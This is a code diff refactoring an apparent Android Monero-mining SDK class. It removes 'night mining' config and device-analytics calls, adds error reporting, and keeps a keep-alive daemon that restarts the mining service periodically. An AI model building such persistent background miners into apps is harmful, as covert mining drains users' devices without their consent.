@@ -1,33 +1,25 @@
 package waterhole.miner.monero;
 
-import android.app.Application;
 import android.content.BroadcastReceiver;
 import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.ServiceConnection;
-import android.os.Build;
 import android.os.Handler;
 import android.os.IBinder;
 import android.os.Looper;
-import android.provider.Settings;
 
 import java.io.ObjectStreamException;
-import java.util.Calendar;
 
-import waterhole.miner.core.AbstractMiner;
-import waterhole.miner.core.analytics.AnalyticsDevice;
-import waterhole.miner.core.analytics.AnalyticsInit;
-import waterhole.miner.core.analytics.AnalyticsWrapper;
-import waterhole.miner.core.asyn.AsyncTaskListener;
-import waterhole.miner.core.config.NightConfiguration;
+import waterhole.miner.core.MinerInterface;
+import waterhole.miner.core.WaterholeMiner;
 import waterhole.miner.core.keepAlive.DaemonEnv;
 import waterhole.miner.core.utils.LogUtils;
 
-import static waterhole.miner.core.utils.LogUtils.error;
+import static waterhole.miner.core.utils.LogUtils.errorWithReport;
 
-public final class XmrMiner extends AbstractMiner {
+public final class XmrMiner extends WaterholeMiner {
 
     private IMiningServiceBinder mServiceBinder;
     private MineReceiver mineReceiver;
@@ -43,7 +35,7 @@ public final class XmrMiner extends AbstractMiner {
                 if (topTemperature != -1)
                     mServiceBinder.setTemperature(topTemperature);
             } catch (Exception e) {
-                error("XmrMiner|ServiceConnection: " + e.getMessage());
+                errorWithReport(getContext(), "XmrMiner|ServiceConnection: " + e.getMessage());
             }
         }
 
@@ -72,20 +64,14 @@ public final class XmrMiner extends AbstractMiner {
         return instance();
     }
 
-    public static void initApplication(final Application application) {
-        if (application == null) {
-            throw new IllegalArgumentException("application is null");
-        }
+    @Override
+    public MinerInterface init(Context context) {
+        MinerInterface minerInterface = super.init(context);
         // 需要在 Application 的 onCreate() 中调用一次 DaemonEnv.initialize()
-        DaemonEnv.initialize(application, TraceServiceImpl.class, DaemonEnv.DEFAULT_WAKE_UP_INTERVAL);
+        DaemonEnv.initialize(context, TraceServiceImpl.class, DaemonEnv.DEFAULT_WAKE_UP_INTERVAL);
         TraceServiceImpl.sShouldStopService = false;
         DaemonEnv.startServiceMayBind(TraceServiceImpl.class);
-
-        // 获取夜挖配置
-        NightConfiguration.instance().fetchConfig(application);
-
-        // 统计设备信息，初始化挖矿数据
-        AnalyticsWrapper.initApplication(application);
+        return minerInterface;
     }
 
     @Override
@@ -112,7 +98,7 @@ public final class XmrMiner extends AbstractMiner {
                 mServiceBinder = null;
             }
         } catch (Exception e) {
-            error("XmrMiner|stopMine: " + e.getMessage());
+            errorWithReport(getContext(), "XmrMiner|stopMine: " + e.getMessage());
         }
     }
 
